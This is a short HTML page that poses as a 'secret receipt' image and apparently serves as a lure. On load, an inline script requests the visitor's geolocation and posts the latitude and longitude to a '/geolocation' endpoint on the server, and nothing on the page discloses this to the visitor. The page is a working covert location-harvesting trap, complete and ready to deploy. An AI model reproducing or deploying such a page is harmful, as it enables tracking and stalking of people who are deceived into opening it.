  <body style="margin: 0; padding: 0; margin-top: 50px; background: black">
    <img
      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHdv1EiT-k_g-QPTe6CqbG4uRmy5JmMcWkhgx_SMob5onZGJbxQHLG9CSuG1oPNyD4mW4y4fQazRqsrG0oZ9_GXs4_kskwE1LIriNxUiJlkh5LvW_hJzu01yuqByPZGUJVvUamugQ703pKue_bv_DAgZd4vix0mgyzpAjYzpnMP-U9VBLlSswlWjpqRwA/s1600/comprovante-SECRETO.jpg"
      alt=""
      srcset=""
      width="100%"
    />

    <script>
      function sendLocation(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const data = { latitude, longitude };

        fetch("/geolocation", {
          method: "POST",
          body: JSON.stringify(data),
        })
          .then((response) => response.json())
          .then((geolocation) => {
            console.log("Geolocalização registrada:", geolocation);
          })
          .catch((error) => {
            console.error("Erro ao registrar geolocalização:", error);
          });
      }

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendLocation);
        } else {
          console.error("Geolocalização não suportada no navegador.");
        }
      }

      getLocation();
    </script>
  </body>
</html>
